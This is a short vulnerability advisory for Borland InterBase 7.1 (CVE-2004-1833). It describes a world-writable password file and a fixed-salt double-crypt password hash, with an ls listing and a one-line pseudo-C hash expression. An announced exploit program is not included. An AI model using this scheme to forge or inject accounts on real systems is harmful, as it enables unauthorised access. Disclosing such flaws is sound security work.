Title: Borland's InterBase 7.1 poor Password Data File Permissions and Password
Hash

Description: Borland InterBase raises the bar for performance and power in
small footprint databases. Designed for use in situations where there is no
database administrator or IT support, InterBase is powerful enough to support
mission-critical applications, yet compact enough to run on very modest
systems. It can be easily transported by disk, CD, or even dial-up download.
And unlike enterprise databases that require expensive ecosystems of support
and maintenance, InterBase requires virtually no maintenance.
Vulnerability:
The "information database" stored in the file admin4.pcb is read and writeable
for all users with local access to the system. [root@Fester interbase]# ls -l /
opt/interbase/admin.ib -rw-rw-rw- 1 root root 616497 Nov 20 10:04 /opt/
interbase/admin.ib Not only is the password file stored read writeable by all
local users but the password hash is done with one salt "9z" and then hashed
again. As an addition to the permissions issue, I thought I should flesh out
the fact that the double crypt() does not add any security to the hash with out
the salt. The purpose of the salt is so that the same passwords dont always
have the same hashes. With them removing the salt the hashes will always be the
same for the same password reguardless of crypt() being called twice. This can
be expressed in this line pesudo C: crypt(&crypt(user_password,"9z")[2],"9z")
CVE-2004-1833
JSON:Export
Exploit Code:
   1. Local attackers can exploit this vulnerability to add or modify accounts
      in Interbase. The following C program will generate hashed passwords that
      can be injected into admin.ib database.
